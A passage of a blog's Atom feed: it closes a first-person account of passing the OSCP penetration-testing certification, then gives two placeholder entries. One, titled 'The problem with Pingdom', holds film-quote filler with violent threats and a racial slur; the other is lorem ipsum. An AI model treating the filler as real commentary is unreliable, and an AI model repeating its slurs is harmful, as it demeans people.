<p>Connection to the labs is via VPN, which is incredibly stable considering the amount of traffic you send through it - this is a testament to the skill of the OffSec admins.   Once you&rsquo;re VPN&rsquo;d in, the labs are your oyster.</p>

<p>The course material is very professional - a PDF of nearly 400 pages, plus over 150 videos - which cover varying pentest techniques from port scanning to SQL injection.  It&rsquo;s a bit daunting at first, but Muts walks you through each example with a soothing voice and with clear concise instructions.  He&rsquo;s like that awesome science teacher you once had at school - you know the one.</p>

<p>The techniques you learn in the videos/PDF are only a small part of the learning required for OSCP.  It is expected that the student performs self study via other resources.  Varying blogs, google searches, wikipedia etc can be used to expand your knowledge, and I found myself initially looking for a particular technique only to disappear down a rabbit hole of related exploits, techniques and vulnerability disclosure write ups.  When they said &ldquo;self study&rdquo; they meant it !</p>

<p>Other than learning an immense amount of skills, I&rsquo;ve met some amazingly clever people via the provided IRC channel (#offsec on Freenode).  The channel is full of admins (who you &ldquo;ping&rdquo; when you need a hint), alumni and students.  I found that certain people were always online when I was, and we naturally teamed up to pool our resources and excitedly boast about compromising the complicated boxes.  Those people were also a sounding block for when the course got too much, or the outcome looked like it was completely fruitless.  Sometimes just talking to these guys resulted in a different path opening up and a compromise minutes later on a box I&rsquo;d wasted 3 days on.</p>

<p>As a personal challenge, I decided I would root every single box available to me, which I achieved.  My final report (which you have to write and submit) was 388 pages long just for the labs !  The exam is the pinnacle of the whole process, where you&rsquo;re given 24 hours to compromise a subset of boxes to get points.  I&rsquo;m not saying you chase after the numbers, but it&rsquo;s very tempting to try and get every point possible.</p>

<p>After 8 hours into the exam (of which the latter 5 hours were just me going nowhere) I had compromised 1 box.  I was ready to give up, but the aforementioned people I&rsquo;d met in the channel urged me to continue and virtually slapped some sense into me.  Within a further 2.5 hours I&rsquo;d accumulated enough points to pass.  I decided to quit while I was ahead and write my exam report.  A further 40 pages of documentation was added, and submitted to the OffSec team along with my lab report.  Now I had to wait for my result&hellip;</p>

<p>My result arrived on the 1st April, in the afternoon (I guess so it didn&rsquo;t look like an April Fools joke).  A pass - that&rsquo;s all you&rsquo;re told - there&rsquo;s no score, no feedback on your report.  Just that wonderful sentence that tells you you&rsquo;ve passed and are now OSCP certified.  Nice.</p>

<p>In the 4 months I spent doing the course I have laughed, I&rsquo;ve cried, I&rsquo;ve stressed out, I&rsquo;ve jumped for joy.  I think I experienced every kind of emotion.  It was fun going into the office and printing out a new diagram showing the new boxes I&rsquo;d compromised the previous evening.  The thrill of being able to explain some of the techniques to people I work with and have them sit there in awe at the cool stuff I&rsquo;d been doing.</p>

<p>So, what next ?  Well - the next step is OSCE.  But that&rsquo;s for another day.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The problem with Pingdom]]></title>
    <link href="http://recrudesce.github.io/blog/2012/07/22/the-problem-with-pingdom/"/>
    <updated>2012-07-22T19:13:00+01:00</updated>
    <id>http://recrudesce.github.io/blog/2012/07/22/the-problem-with-pingdom</id>
    <content type="html"><![CDATA[<figure class='code'><figcaption><span>Time to be Awesome - awesome.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="nb">puts</span> <span class="s2">&quot;Awesome!&quot;</span> <span class="k">unless</span> <span class="n">lame</span>
</span></code></pre></td></tr></table></div></figure>


<p><a href="http://www.pingdom.com%20Pingdom">The problem with pingdom.</a></p>

<p>My money&rsquo;s in that office, right? If she start giving me some bullshit about it ain&rsquo;t there, and we got to go someplace else and get it, I&rsquo;m gonna shoot you in the head then and there. Then I&rsquo;m gonna shoot that bitch in the kneecaps, find out where my goddamn money is. She gonna tell me too. Hey, look at me when I&rsquo;m talking to you, motherfucker. You listen: we go in there, and that nigga Winston or anybody else is in there, you the first motherfucker to get shot. You understand?</p>

<blockquote><p>Blockquote is what goes
inside this block here
would you believe that
bullshit?</p></blockquote>

<p>Well, the way they make shows is, they make one show. That show&rsquo;s called a pilot. Then they show that show to the people who make shows, and on the strength of that one show they decide if they&rsquo;re going to make more shows. Some pilots get picked and become television programs. Some don&rsquo;t, become nothing. She starred in one of the ones that became nothing.</p>

<p>The path of the righteous man is beset on all sides by the iniquities of the selfish and the tyranny of evil men. Blessed is he who, in the name of charity and good will, shepherds the weak through the valley of darkness, for he is truly his brother&rsquo;s keeper and the finder of lost children. And I will strike down upon thee with great vengeance and furious anger those who would attempt to poison and destroy My brothers. And you will know My name is the Lord when I lay My vengeance upon thee.</p>

<p>Your bones don&rsquo;t break, mine do. That&rsquo;s clear. Your cells react to bacteria and viruses differently than mine. You don&rsquo;t get sick, I do. That&rsquo;s also clear. But for some reason, you and I react the exact same way to water. We swallow it too fast, we choke. We get some in our lungs, we drown. However unreal it may seem, we are connected, you and I. We&rsquo;re on the same curve, just on opposite ends.</p>

<p>Do you see any Teletubbies in here? Do you see a slender plastic tag clipped to my shirt with my name printed on it? Do you see a little Asian child with a blank expression on his face sitting outside on a mechanical helicopter that shakes when you put quarters in it? No? Well, that&rsquo;s what you see at a toy store. And you must think you&rsquo;re in a toy store, because you&rsquo;re here shopping for an infant named Jeb.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Intro]]></title>
    <link href="http://recrudesce.github.io/blog/2012/07/22/intro/"/>
    <updated>2012-07-22T08:23:00+01:00</updated>
    <id>http://recrudesce.github.io/blog/2012/07/22/intro</id>
    <content type="html"><![CDATA[<p>Testing!</p>

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Duis sollicitudin, massa eu vestibulum laoreet, nibh ante vulputate lorem, ac lobortis ante tellus eu mi. Duis sem nisi, luctus at feugiat eget, fringilla ut tellus. Nam a molestie justo. Sed pulvinar est vitae tellus semper tincidunt. Fusce euismod luctus lacus nec placerat. Mauris rutrum scelerisque nulla ut tempor. Nunc porttitor posuere mi, aliquet vehicula lorem feugiat in. Ut ut fermentum risus. Aliquam tincidunt ultricies ante sit amet bibendum. Cras nec sapien odio. Duis posuere congue sem, at congue massa faucibus at.</p>

<p>Integer ut sapien eget nisl auctor faucibus ut fermentum arcu. Nunc rutrum urna non risus congue et tristique felis eleifend. Maecenas blandit est eu mauris aliquam aliquet. Quisque porttitor enim eget risus blandit in mollis orci eleifend. Nam malesuada nulla sed lacus elementum placerat accumsan arcu rhoncus. Phasellus feugiat cursus turpis nec facilisis. Duis eget metus arcu, eget commodo velit. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. Integer cursus vulputate enim, vel gravida velit faucibus et. Ut a urna vitae tellus cursus rhoncus. Maecenas at odio eget quam cursus elementum. Aliquam vitae eros quis tellus laoreet accumsan sed id lorem. Suspendisse et rutrum leo. Integer scelerisque vestibulum adipiscing. In posuere, libero ac accumsan suscipit, nulla ligula gravida erat, ut tempor odio erat nec sem. Quisque justo ipsum, adipiscing volutpat varius vitae, blandit eget nisi.</p>

<p>Nullam adipiscing neque ac lacus commodo vitae imperdiet dui sollicitudin. Ut ac nunc augue. Nam at sem ut quam commodo aliquet vitae vitae dui. Vivamus scelerisque felis eget dolor cursus feugiat. Phasellus at dui sed lectus scelerisque pretium. Etiam nec massa ut justo vestibulum fringilla ac vitae urna. Morbi tortor erat, tempus sed consectetur at, elementum nec eros. Vivamus mattis arcu a sapien semper non lacinia eros pretium.</p>

<p>Proin ut hendrerit arcu. Maecenas ullamcorper tristique magna vel mattis. Pellentesque habitant morbi tristique senectus et netus et malesuada fames ac turpis egestas. Nullam tincidunt euismod viverra. In sit amet neque turpis. Suspendisse ac sapien mi, id blandit purus. Ut tortor turpis, rutrum ac tempor at, accumsan sit amet erat. Etiam ultricies eleifend dolor, eget tempus justo tristique vitae. In hac habitasse platea dictumst. Aliquam eu enim neque.</p>

<p>Morbi massa lorem, viverra non dictum at, malesuada vel nibh. Nam fermentum lobortis varius. Sed a nulla lacus, quis posuere risus. Nunc id urna libero, quis rutrum mi. In gravida felis urna. Praesent nec dolor ac urna tempor fermentum. Curabitur rutrum arcu et lorem volutpat viverra.</p>
]]></content>
  </entry>
  
</feed>
